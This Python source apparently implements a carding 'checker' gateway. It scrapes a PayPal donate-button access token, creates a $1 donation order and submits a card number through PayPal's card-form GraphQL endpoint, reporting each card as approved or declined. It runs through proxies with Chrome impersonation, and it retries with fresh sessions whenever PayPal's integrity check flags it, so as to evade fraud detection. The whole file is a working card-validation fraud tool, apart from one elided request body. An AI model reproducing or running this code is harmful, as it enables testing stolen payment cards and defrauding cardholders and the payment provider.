class gateway:
    @staticmethod
    async def code(card: str, prox: str = None) -> tuple:
        proxy = f"http://{prox}" if prox and "://" not in prox else prox
        ccd = tools.getcard(card, 2, 2)
        
        for intento in range(3):
            try:
                async with AsyncSession(impersonate="chrome120", proxy=proxy) as session:
                    user = tools.userdata()
                    card_type = tools.get_card_type(ccd['cc'][0])
                    
                    # ========== >_ Req 1: Token
                    headers = {
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                        'Accept-Language': 'en-US,en;q=0.9',
                        'Sec-Fetch-Dest': 'document',
                        'Sec-Fetch-Mode': 'navigate',
                        'Sec-Fetch-Site': 'none',
                        'Sec-Fetch-User': '?1',
                        'Upgrade-Insecure-Requests': '1'
                    }
                    url1 = 'https://www.paypal.com/smart/buttons?style.label=donate&style.layout=vertical&style.color=blue&style.shape=pill&style.tagline=false&style.menuPlacement=below&sdkVersion=5.0.390&components.0=buttons&locale.lang=en&locale.country=US&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QWVuMjlWSEhpd2ljZWxsOWx6NGd4Yi1EaV9uNHhlUlkzWkdpd3l1UVk2bV9MUUlrTmNaMHh5ZEFnUE1NbmpFelFxTUNVblBtZ0ZHY2FIZmgmZW5hYmxlLWZ1bmRpbmc9dmVubW8mY3VycmVuY3k9VVNEIiwiYXR0cnMiOnsiZGF0YS1zZGstaW50ZWdyYXRpb24tc291cmNlIjoiYnV0dG9uLWZhY3RvcnkiLCJkYXRhLXVpZCI6InVpZF96aHV1bGxtaWxmaXVtY3djamhsZHpyb215bW91eHIifX0&clientID=Aen29VHHiwicell9lz4gxb-Di_n4xeRY3ZGiwyuQY6m_LQIkNcZ0xydAgPMMnjEzQqMCUnPmgFGcaHfh&sdkCorrelationID=f308033f5c550&storageID=uid_e775778837_mja6mzg6mty&sessionID=uid_1a87d97aea_mja6mzg6mty&buttonSessionID=uid_1e550b2bd0_mja6mzg6mty&env=production&buttonSize=small&fundingEligibility=eyJwYXlwYWwiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6ZmFsc2V9LCJwYXlsYXRlciI6eyJlbGlnaWJsZSI6ZmFsc2UsInByb2R1Y3RzIjp7InBheUluMyI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhcmlhbnQiOm51bGx9LCJwYXlJbjQiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXJpYW50IjpudWxsfSwicGF5bGF0ZXIiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXJpYW50IjpudWxsfX19LCJjYXJkIjp7ImVsaWdpYmxlIjp0cnVlLCJicmFuZGVkIjp0cnVlLCJpbnN0YWxsbWVudHMiOmZhbHNlLCJ2ZW5kb3JzIjp7InZpc2EiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sIm1hc3RlcmNhcmQiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sImFtZXgiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sImRpc2NvdmVyIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfSwiaGlwZXIiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXVsdGFibGUiOmZhbHNlfSwiZWxvIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfSwiamNiIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfX0sImd1ZXN0RW5hYmxlZCI6ZmFsc2V9LCJ2ZW5tbyI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJpdGF1Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImNyZWRpdCI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJhcHBsZXBheSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJzZXBhIjp7ImVsaWdpYmxlIjpmYWxzZX0sImlkZWFsIjp7ImVsaWdpYmxlIjpmYWxzZX0sImJhbmNvbnRhY3QiOnsiZWxpZ2libGUiOmZhbHNlfSwiZ2lyb3BheSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJlcHMiOnsiZWxpZ2libGUiOmZhbHNlfSwic29mb3J0Ijp7ImVsaWdpYmxlIjpmYWxzZX0sIm15YmFuayI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJwMjQiOnsiZWxpZ2libGUiOmZhbHNlfSwid2VjaGF0cGF5Ijp7ImVsaWdpYmxlIjpmYWxzZX0sInBheXUiOnsiZWxpZ2libGUiOmZhbHNlfSwiYmxpayI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJ0cnVzdGx5Ijp7ImVsaWdpYmxlIjpmYWxzZX0sIm94eG8iOnsiZWxpZ2libGUiOmZhbHNlfSwiYm9sZXRvIjp7ImVsaWdpYmxlIjpmYWxzZX0sImJvbGV0b2JhbmNhcmlvIjp7ImVsaWdpYmxlIjpmYWxzZX0sIm1lcmNhZG9wYWdvIjp7ImVsaWdpYmxlIjpmYWxzZX0sIm11bHRpYmFuY28iOnsiZWxpZ2libGUiOmZhbHNlfSwic2F0aXNwYXkiOnsiZWxpZ2libGUiOmZhbHNlfSwicGFpZHkiOnsiZWxpZ2libGUiOmZhbHNlfX0&platform=mobile&experiment.enableVenmo=true&experiment.enableVenmoAppLabel=false&flow=purchase&currency=USD&intent=capture&commit=true&vault=false&enableFunding.0=venmo&renderedButtons.0=paypal&renderedButtons.1=card&debug=false&applePaySupport=false&supportsPopups=true&supportedNativeBrowser=true&allowBillingPayments=true&disableSetCookie=false'
                    
                    response = await session.get(url1, headers=headers)
                    
                    # Validación extra: Si no hay token, que falle rápido
                    token = tools.find_between(response.text, '"facilitatorAccessToken":"', '"')
                    if not token: 
                        print(f"[Intento {intento+1}] Token no encontrado. Reintentando...")
                        continue
                    
                    # ========== >_ Req 2: Crear Orden
                    headers = {'content-type': 'application/json', 'authorization': f'Bearer {token}'}
                    order_data = '{"purchase_units":[{"amount":{"currency_code":"USD","value":"1","breakdown":{"item_total":{"currency_code":"USD","value":"1"}}},"items":[{"name":"Test","unit_amount":{"currency_code":"USD","value":"1"},"quantity":"1","category":"DONATION"}]}],"intent":"CAPTURE"}'
                    response = await session.post('https://www.paypal.com/v2/checkout/orders', headers=headers, data=order_data)
                    
                    order_id = tools.find_between(response.text, '"id":"', '"')
                    if not order_id: 
                        print(f"[Intento {intento+1}] ID de Orden no encontrado.")
                        continue
                    
                    # ========== >_ Req 3: Enviar Tarjeta
                    headers = {'paypal-client-context': order_id, 'x-app-name': 'standardcardfields', 'content-type': 'application/json'}
                    json_data = { ... } # (Deja tus variables igual que antes)
                    
                    response = await session.post('https://www.paypal.com/graphql?fetch_credit_form_submit', headers=headers, json=json_data)
                    
                    # ========== >_ LÓGICA DE RESPUESTA ==========
                    if '"errors"' in response.text:
                        error_msg = tools.find_between(response.text, '"message":"', '"')
                        if "GUEST_PAYMENT_INTEGRITY" in error_msg:
                            print(f"[Intento {intento+1}] Error de Integridad. Reintentando con nueva sesión...")
                            continue # Si da error de integridad, forzamos un reintento limpio
                            
                        return "Declined", f"{error_msg}"
                    
                    elif '"data":null' in response.text:
                        return "Declined", "Generic Error (No Data)"
                    
                    else:
                        return "Approved", "success"

            except Exception as e:
                print(f"Excepción en intento {intento+1}: {e}")
                continue
        
        return "Declined", "Max Retries - Integrity Failed"
